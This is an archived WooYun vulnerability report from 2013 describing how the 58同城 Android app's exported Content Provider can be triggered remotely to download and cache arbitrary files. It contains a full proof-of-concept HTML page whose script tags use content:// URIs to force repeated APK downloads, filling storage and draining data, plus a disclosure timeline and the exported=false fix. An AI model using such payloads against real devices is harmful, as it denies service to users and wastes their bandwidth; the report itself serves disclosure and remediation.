@@ -1,0 +1,203 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		58同城Android客户端远程文件写入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		58同城Android客户端远程文件写入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/x3xtxt">x3xtxt</a> 
+</li><li>提交时间：		2013-11-29 14:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-29：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-29：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-02：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-09：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-19：	细节向普通白帽子公开<br/>
+									2014-01-08：	细节向实习白帽子公开<br/>
+									2014-02-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">58同城Android客户端Content Provider组件的实现存在缺陷，可以远程调用此接口向用户手机写入任意数据，比如：可以默默地把内存卡塞满，可以默默地把用户的流量耗尽，结果是用户不得不默默地把58客户端卸载掉。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">58同城Android客户端中包含一个下载并缓存远程内容的Content Provider，即com.wuba.LocalFileContentProvider，此Content Provider采用默认的导出配置，即android:exported=&quot;true&quot;，任意第三方APP都可以调用此接口访问数据。该Content Provider实现了openFile()接口，通过此接口可以访问外部网络中的数据，并将其缓存到私有目录/data/data/com.wuba/wbcache目录中。调用此接口可以向/data/data/com.wuba/wbcache目录无限制填充数据，Android没有明确指明分配给每个APP的私有存储空间，因此，可以写满整个内存卡，导致手机不能正常使用，当然，也可以默默地把用户手机流量耗尽。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">使用浏览器（支持content://）打开包含如下内容的链接，浏览器就会调用58同城客户端APP对应的Content Provider组件下载并缓存远程的文件，作为示例，仅仅让它下载一些apk文件。<br />
+<br />
+</p><pre><code>&lt;!DOCTYPE html&gt;<br />
+&lt;html lang=&quot;zh-CN&quot;&gt;<br />
+&lt;head&gt;<br />
+&lt;meta charset=&quot;utf-8&quot; /&gt;<br />
+    &lt;title&gt;58 Content Provider File Operations PoC&lt;/title&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://file.m.163.com/app/free/201309/25/com.rovio.angrybirdsstarwarsii.premium_1020.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/928b341dc0b94f3a/zhiwudazhanjiangshi2gaoqing_4.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/4e67b9f0384ee4dd/renjiang_12.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://bs.baidu.com/appstore/apk_AC94C669DEC40B8F50DA9A9221752592.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/42cff8368e556f27/fengkuangdelaonainai_139.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://cdn.market.hiapk.com/data/upload/2013/09_07/2/com.ddstudio.pushdoll_020716.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://www.apk.anzhi.com/data1/apk/201309/27/com.toccata.games.kkdfvndjvdfge18_87500200.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://www.apk.anzhi.com/data1/apk/201309/29/com.chillingo.totemrunner.android.ajagplay_63022000.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/7e78cb8aa3110315/dazhangmen_21.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://file.m.163.com/app/free/201309/25/com.puzzle_wolf.game_69.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/c5f698e149f63522/cangqiongzhijian_10103.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://file.m.163.com/app/free/201309/19/com.obv.google.monstergemisland_5.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://file.m.163.com/app/free/201309/25/com.rovio.angrybirdsstarwarsii.premium_1020.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/928b341dc0b94f3a/zhiwudazhanjiangshi2gaoqing_4.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/538699f8012d85fb/wuxiaQchuan_9.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://cdn.market.hiapk.com/data/upload//2013/10_09/16/com.djinnworks.StickmanDownhill_165723.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/785ff9b7a5a05fd6/shikonglieren_44.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://static.nduoa.com/apk/610/610752/1327991/com.djinnworks.StickStuntBiker2.free.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/4e67b9f0384ee4dd/renjiang_12.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://bs.baidu.com/appstore/apk_AC94C669DEC40B8F50DA9A9221752592.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/9772a815413b7a20/yaojisanguo_7602.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://www.apk.anzhi.com/data1/apk/201310/11/com.doublefine.rednaers_21702800.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/d1c10bd03497bbb1/BottleCap_122.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://bs.baidu.com/appstore/apk_E6D3382E30FB5562EA07E3E865D32086.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/65343e8d1b984faa/wojiaoMT_3102.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+    &lt;script type=&quot;text/javascript&quot; src=&quot;content://com.wuba.hybrid.localfile/1.http://gdown.baidu.com/data/wisegame/3d43cff7e9e88120/YYshuihu_3.apk?cachevers=58.tieyou.com&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;<br />
+&lt;/head&gt;<br />
+<br />
+&lt;body&gt;<br />
+  &lt;h1&gt;58 Content Provider File Operations PoC&lt;/h1&gt;  <br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">凡只用于内部调用的组件，导出配置都应该设置为false，即android:exported=&quot;false&quot;。  </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/x3xtxt" title="x3xtxt">x3xtxt</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-044411" title="58同城Android客户端远程文件写入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-11-29 16:22</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢对58同城安全的关注，我们会尽快修复处理！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="44411";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
